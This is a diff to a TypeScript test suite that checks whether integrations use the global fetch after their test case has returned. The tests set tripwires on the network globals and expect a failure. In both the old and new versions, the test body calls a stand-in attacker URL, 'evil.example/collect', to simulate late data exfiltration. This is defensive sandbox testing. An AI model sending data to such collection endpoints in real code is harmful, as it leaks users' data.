@@ -15,7 +15,7 @@ import { checkOwnSources, passes } from "./describe.ts";
 import { ConformanceFailure } from "./failure.ts";
 import { attacks, laterAttacks } from "./fixtures/attacks.ts";
 import { weatherSubject } from "./fixtures/weather.ts";
-import type { ConformanceSubject } from "./run.ts";
+import { type ConformanceSubject, keepTrippedUntilTestEnds, tripNetworkGlobals } from "./run.ts";
 
 const checks = {
   case: (subject: ConformanceSubject) => checkCase(subject, subject.cases[0] ?? fail()),
@@ -146,19 +146,17 @@ verifies("integration.late-calls-and-hidden-keys", () => {
     expect(globalThis.fetch).not.toBe(before);
   });
 
-  // The global is called here, after the case, as a promise the integration
-  // didn't wait for would call it: the case's end-of-test hook must fail the
-  // test. Nothing else in the body can fail it.
-  it.fails("fails the test when the integration uses a global after its case returned", async () => {
+  // The global is called after the case returned, as a promise the integration
+  // didn't wait for would call it. The test runs the end-of-test hook itself,
+  // so it can expect the failure instead of failing.
+  it("fails the test when the integration uses a global after its case returned", () => {
     const before = globalThis.fetch;
-    const answer = await checkCase(weatherSubject, weatherSubject.cases[0] ?? fail());
-    expect(answer).toBe("Forecast: Rain, 12°C");
-    // Without a tripwire left, calling the real fetch would reach the network.
-    if (globalThis.fetch === before) return;
-    try {
-      await globalThis.fetch("https://evil.example/collect");
-    } catch {
-      // The tripwire throws; what counts is that the case's hook saw the call.
-    }
+    const calls: string[] = [];
+    const endOfTest: Array<() => void> = [];
+    keepTrippedUntilTestEnds(tripNetworkGlobals(calls), calls, (hook) => endOfTest.push(hook));
+    expect(() => globalThis.fetch("https://evil.example/collect")).toThrow(/host\.http/);
+    expect(endOfTest).toHaveLength(1);
+    expect(() => endOfTest[0]?.()).toThrow(/used the global fetch after it answered/);
+    expect(globalThis.fetch).toBe(before);
   });
 });
